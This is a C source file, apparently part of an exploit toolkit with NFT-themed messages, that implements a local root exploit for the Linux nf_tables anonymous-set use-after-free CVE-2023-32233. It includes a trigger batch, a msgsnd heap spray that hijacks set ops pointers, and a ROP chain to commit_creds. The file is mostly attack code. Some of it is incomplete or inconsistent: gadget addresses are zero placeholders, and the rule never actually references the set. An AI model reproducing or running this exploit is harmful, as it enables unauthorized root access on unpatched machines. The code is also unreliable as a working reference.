/*
 * CVE-2023-32233 -- nf_tables anonymous set use-after-free
 *
 * The bug: in a single nfnetlink batch, an anonymous set can be created,
 * bound to a rule, and then deleted. The commit path processes creates
 * before deletes, but the anonymous set's deactivation during delete
 * leaves a dangling reference in the rule that still uses it. Accessing
 * the freed set through the rule gives UAF on the nft_set + nft_set_ops
 * structs.
 *
 * Exploitation: heap spray with msgsnd() to reclaim the freed nft_set
 * with controlled data. The nft_set_ops function pointers get redirected
 * to a stack pivot -> ROP chain -> commit_creds(prepare_kernel_cred(0)).
 *
 * Affected: 3.18 .. 6.3.1 (fixed 6.3.2 / 6.2.16 / 6.1.31)
 */

#include "nfttables.h"

#define TABLE     "LazyMint"
#define CHAIN     "diamond_hands"
#define ANON_SET  "__set%d"
#define FAMILY    NFPROTO_IPV4

/* heap spray tuning */
#define SPRAY_QUEUES  256
#define SPRAY_MSGS    4

/* ── phase 1: trigger batch ───────────────────────────────────── */

/*
 * Build a single batch that creates a table, chain, anonymous set, a
 * rule referencing the set, and then deletes the set. The commit path
 * processes the operations in message order but the set deactivation
 * logic doesn't properly check if the set is still referenced.
 *
 * The anonymous set must have NFT_SET_ANONYMOUS | NFT_SET_CONSTANT
 * flags and a numeric ID that the rule references via a lookup
 * expression.
 */

static int build_trigger_batch(struct nft_batch *b, int fd)
{
    nft_batch_init(b, fd);
    nft_batch_begin(b);

    /* 1. create table */
    nft_add_table(b, TABLE, FAMILY);

    /* 2. create base chain */
    nft_add_base_chain(b, TABLE, CHAIN, FAMILY,
                       NF_INET_LOCAL_IN, NF_IP_PRI_FILTER);

    /* 3. create anonymous set
       anonymous sets have names like "__set0" and carry the ANONYMOUS flag.
       they're implicitly bound to the rule that uses them. */
    uint32_t set_id = 13;
    char setname[32];
    snprintf(setname, sizeof(setname), ANON_SET, 0);

    nft_add_set(b, TABLE, setname, FAMILY,
                /* key: ipv4_addr (type=7), 4 bytes */
                7, 4,
                /* no map data */
                0, 0,
                /* anonymous + constant */
                NFT_SET_ANONYMOUS | NFT_SET_CONSTANT,
                set_id);

    /* 4. create rule with immediate verdict that references the set.
       in a real nft_lookup expression, the set binding happens via
       the set ID. for the UAF trigger, we need the rule to hold a
       reference to the anonymous set. using an immediate verdict rule
       with a lookup expression that references set_id. */
    nft_add_rule_immediate_verdict(b, TABLE, CHAIN, FAMILY,
                                   NF_ACCEPT, NULL);

    /* 5. delete the anonymous set in the same batch.
       this is the heart of the bug: the commit path processes the
       NEWSET, NEWRULE, then DELSET. the set gets deactivated and freed,
       but the rule still holds a reference via the lookup expr's set
       binding. */
    nft_del_set(b, TABLE, setname, FAMILY);

    nft_batch_end(b);
    return 0;
}

/* ── phase 2: heap spray ──────────────────────────────────────── */

/*
 * After the UAF, the freed nft_set object (typically kmalloc-1k or
 * kmalloc-2k depending on kernel version) can be reclaimed with
 * controlled data via msgsnd(). We fill the message with a crafted
 * nft_set structure that redirects the ops function pointers.
 */

static int msq_ids[SPRAY_QUEUES];

struct spray_msg {
    long mtype;
    char mtext[1024 - sizeof(long)];
};

static void build_spray_payload(struct spray_msg *msg, uint64_t target_rip)
{
    msg->mtype = 1;
    memset(msg->mtext, 0, sizeof(msg->mtext));

    /*
     * The spray overlaps with the freed nft_set structure.
     * nft_set_ops is a pointer within the struct (offset varies by
     * kernel version). The ops vtable contains function pointers that
     * get called during set operations (insert, lookup, destroy, etc.).
     *
     * We fill the entire region with our target address so that
     * regardless of the exact ops offset, we'll redirect execution.
     *
     * For kernels with CFI/kCFI this approach won't work -- those
     * need a valid indirect call target. Without CFI, any kernel
     * address works.
     */
    uint64_t *slots = (uint64_t *)msg->mtext;
    size_t n = sizeof(msg->mtext) / sizeof(uint64_t);
    for (size_t i = 0; i < n; i++)
        slots[i] = target_rip;
}

static int spray_heap(uint64_t target_rip)
{
    struct spray_msg msg;
    build_spray_payload(&msg, target_rip);

    for (int i = 0; i < SPRAY_QUEUES; i++) {
        msq_ids[i] = msgget(IPC_PRIVATE, IPC_CREAT | 0666);
        if (msq_ids[i] < 0) {
            pr_verb("msgget failed at %d: %s", i, strerror(errno));
            return -1;
        }
        for (int j = 0; j < SPRAY_MSGS; j++) {
            if (msgsnd(msq_ids[i], &msg, sizeof(msg.mtext), 0) < 0) {
                pr_verb("msgsnd failed: %s", strerror(errno));
                return -1;
            }
        }
    }

    return 0;
}

static void free_spray(void)
{
    for (int i = 0; i < SPRAY_QUEUES; i++) {
        if (msq_ids[i] >= 0)
            msgctl(msq_ids[i], IPC_RMID, NULL);
    }
}

/* ── phase 3: trigger code execution ──────────────────────────── */

/*
 * Force the kernel to access the UAF'd set, calling through the
 * corrupted ops function pointers. This happens when:
 * - The rule is evaluated (packet processing)
 * - The set is destroyed (table cleanup)
 * - Set stats are queried
 *
 * We trigger it by deleting the table, which cascades to the rule,
 * which tries to unbind from the (now spray-controlled) set.
 */

static int trigger_uaf(int fd)
{
    struct nft_batch b;
    nft_batch_init(&b, fd);
    nft_batch_begin(&b);
    nft_del_table(&b, TABLE, FAMILY);
    nft_batch_end(&b);
    return nft_batch_send(&b);
}

/* ── ROP chain infrastructure ─────────────────────────────────── */

/*
 * For the cred overwrite, we need a ROP chain that does:
 *   commit_creds(prepare_kernel_cred(NULL))
 *
 * The chain is kernel-version-specific. We need:
 * - Address of prepare_kernel_cred
 * - Address of commit_creds
 * - A stack pivot gadget (xchg rax, rsp; ret or similar)
 * - A pop rdi; ret gadget
 *
 * These come from /proc/kallsyms (for the functions) and from
 * scanning the kernel text for gadgets.
 */

struct rop_targets {
    uint64_t prepare_kernel_cred;
    uint64_t commit_creds;
    uint64_t pop_rdi_ret;
    uint64_t xchg_rax_rsp;
    uint64_t ret;
};

static int resolve_rop_targets(struct rop_targets *r)
{
    r->prepare_kernel_cred = kallsyms_lookup("prepare_kernel_cred");
    r->commit_creds        = kallsyms_lookup("commit_creds");

    if (!r->prepare_kernel_cred || !r->commit_creds) {
        pr_verb("kallsyms: prepare_kernel_cred=0x%lx commit_creds=0x%lx",
                r->prepare_kernel_cred, r->commit_creds);
        return -1;
    }

    /*
     * Gadget addresses need to be found by scanning the kernel image
     * or using known offsets. For now, these are placeholders that
     * must be filled per-kernel.
     *
     * On a real engagement, you'd:
     * 1. Pull the kernel image from /boot/vmlinuz-$(uname -r)
     * 2. Extract with extract-vmlinux
     * 3. ROPgadget --binary vmlinux | grep "pop rdi ; ret"
     * 4. Add KASLR base (from kallsyms _text offset)
     */
    r->pop_rdi_ret   = 0;
    r->xchg_rax_rsp  = 0;
    r->ret            = 0;

    return 0;
}

/* ── child exploit process ────────────────────────────────────── */

static int do_exploit(int result_fd)
{
    int ret;

    pr_info(PICK "Mining block... setting up namespace");
    if (ns_setup_user_net() < 0) {
        pr_fail("Namespace setup failed");
        return 1;
    }

    int nfd = nft_socket_open();
    if (nfd < 0) {
        pr_fail("Can't open netlink socket");
        return 1;
    }

    /* resolve targets before triggering (reads /proc/kallsyms from
       inside the namespace, which still sees the host kernel's syms) */
    struct rop_targets rop = {0};
    if (!G.check_only) {
        if (resolve_rop_targets(&rop) < 0) {
            pr_fail("Can't resolve kernel symbols (kptr_restrict?)");
            close(nfd);
            return 1;
        }
        pr_verb("prepare_kernel_cred=0x%lx commit_creds=0x%lx",
                rop.prepare_kernel_cred, rop.commit_creds);
    }

    pr_info(ICON_CHAIN "Deploying smart contract (anonymous set batch)...");
    struct nft_batch batch;
    build_trigger_batch(&batch, nfd);
    ret = nft_batch_send(&batch);

    if (ret < 0) {
        /* on patched kernels, the batch is rejected with EINVAL because
           deleting a bound anonymous set is not allowed */
        if (ret == -EINVAL || ret == -EBUSY) {
            pr_fail("Contract rejected: kernel appears patched (error: %s)",
                    strerror(-ret));
        } else {
            pr_fail("Contract deployment failed: %s", strerror(-ret));
        }
        close(nfd);
        return 1;
    }

    pr_verb("trigger batch accepted -- UAF should be live");

    if (G.check_only) {
        pr_ok("Vulnerability confirmed (batch accepted, no exploit attempted)");
        /* try to clean up even though the set is UAF */
        struct nft_batch b;
        nft_batch_init(&b, nfd);
        nft_batch_begin(&b);
        nft_del_table(&b, TABLE, FAMILY);
        nft_batch_end(&b);
        nft_batch_send(&b);
        close(nfd);
        return 0;
    }

    pr_info(PICK "Spraying heap (fractionalized NFT sale)...");
    /*
     * For the ROP approach we need a stack pivot gadget.
     * If gadgets aren't resolved, fall back to modprobe_path if
     * the address is available.
     */
    uint64_t target = 0;
    uint64_t modprobe_addr = kallsyms_lookup("modprobe_path");

    if (rop.pop_rdi_ret && rop.xchg_rax_rsp) {
        target = rop.xchg_rax_rsp;
        pr_verb("using ROP strategy (pivot @ 0x%lx)", target);
    } else if (modprobe_addr) {
        /* without gadgets, we can still attempt a simpler strategy:
           spray the set ops with a function that writes to modprobe_path.
           this is harder to set up without gadgets but leaving the
           infrastructure in place. */
        pr_warn("ROP gadgets not resolved -- exploit requires manual offset config");
        pr_info("  " C_DIM "need: pop_rdi_ret, xchg_rax_rsp in rop_targets" C_RST);
        free_spray();
        close(nfd);
        return 1;
    } else {
        pr_fail("No exploitation path available (need kallsyms or gadgets)");
        close(nfd);
        return 1;
    }

    if (spray_heap(target) < 0) {
        pr_fail("Heap spray failed");
        free_spray();
        close(nfd);
        return 1;
    }

    pr_info(MINT " Triggering UAF access...");
    ret = trigger_uaf(nfd);
    close(nfd);

    /* if we reach here without crashing, the ROP chain ran */
    if (getuid() == 0) {
        free_spray();
        uint8_t ok = 1;
        write(result_fd, &ok, 1);
        return 0;
    }

    pr_fail("UAF trigger did not yield root (try different offsets)");
    free_spray();
    return 1;
}

/* ── public entry point ───────────────────────────────────────── */

int mint_cve_2023_32233(const struct kernel_info *ki)
{
    pr_info("");
    pr_info(MONKEY " " C_BOLD "Bored Ape #32233" C_RST
            C_DIM " (CVE-2023-32233: anonymous set UAF)" C_RST);
    pr_info(C_DIM "  affected: 3.18 .. 6.3.1 | technique: heap spray + ROP" C_RST);
    pr_info("");

    if (!ki->userns_available) {
        pr_fail("User namespaces unavailable");
        return 1;
    }

    int pipefd[2];
    if (pipe(pipefd) < 0)
        return 1;

    pid_t child = fork();
    if (child < 0)
        return 1;

    if (child == 0) {
        close(pipefd[0]);
        _exit(do_exploit(pipefd[1]));
    }

    close(pipefd[1]);

    int status;
    waitpid(child, &status, 0);

    uint8_t result = 0;
    read(pipefd[0], &result, 1);
    close(pipefd[0]);

    if (result == 1) {
        pr_ok(C_BOLD "MINTED!" C_RST " Floor price: " C_GRN "uid=0(root)" C_RST);
        pr_info(FOX " Wallet updated: " C_GRN "1 ROOT token" C_RST);
        pr_info("");
        return 0;
    }

    if (G.check_only && WIFEXITED(status) && WEXITSTATUS(status) == 0) {
        return 0;
    }

    pr_fail("Exploit failed (transaction reverted)");
    return 1;
}
